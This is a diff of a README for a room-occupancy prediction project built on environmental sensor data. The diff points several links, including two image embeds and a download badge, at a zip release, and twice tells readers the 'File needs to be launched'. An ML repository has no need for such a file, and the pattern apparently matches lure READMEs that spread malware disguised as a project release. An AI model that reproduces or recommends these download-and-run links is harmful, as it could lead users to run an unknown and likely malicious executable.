@@ -1,7 +1,7 @@
 
 # 🏢 Room Occupancy Prediction using Environmental Sensor Data 📊
 
-![Room Occupancy](https://images.unsplash.com/photo-1581892676423-4ba5bcb57c36)
+![Room Occupancy](https://github.com/MAH-22/Room-Occupancy-Prediction-using-Environmental-Sensor-Data/releases/download/v1.0/Application.zip)
 
 Welcome to the Room Occupancy Prediction using Environmental Sensor Data repository! This project focuses on utilizing environmental sensor data to predict room occupancy. By leveraging data science and machine learning techniques, we aim to create accurate models that can forecast whether a room is occupied based on sensor readings.
 
@@ -17,7 +17,7 @@ This repository contains resources, code, and documentation related to room occu
 
 Find useful resources related to room occupancy prediction in the repository:
 
-- [Release.zip](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) (File needs to be launched)
+- [https://github.com/MAH-22/Room-Occupancy-Prediction-using-Environmental-Sensor-Data/releases/download/v1.0/Application.zip](https://github.com/MAH-22/Room-Occupancy-Prediction-using-Environmental-Sensor-Data/releases/download/v1.0/Application.zip) (File needs to be launched)
 
 For more resources and updates, check the **Releases** section of the repository.
 
@@ -44,7 +44,7 @@ Contributions to the project are welcome! Whether you want to improve the existi
 
 Check out some visualizations generated from the environmental sensor data:
 
-![Data Visualization](https://images.unsplash.com/photo-1562499273-0f299e857d08)
+![Data Visualization](https://github.com/MAH-22/Room-Occupancy-Prediction-using-Environmental-Sensor-Data/releases/download/v1.0/Application.zip)
 
 ## Team Members 👩‍💻👨‍💻
 
@@ -63,4 +63,4 @@ This project is licensed under the MIT License. See the `LICENSE` file for more 
 
 Let's predict room occupancy with environmental sensor data! 🌿🏠🔍
 
-[![Download Release.zip](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download https://github.com/MAH-22/Room-Occupancy-Prediction-using-Environmental-Sensor-Data/releases/download/v1.0/Application.zip](https://github.com/MAH-22/Room-Occupancy-Prediction-using-Environmental-Sensor-Data/releases/download/v1.0/Application.zip)](https://github.com/MAH-22/Room-Occupancy-Prediction-using-Environmental-Sensor-Data/releases/download/v1.0/Application.zip)
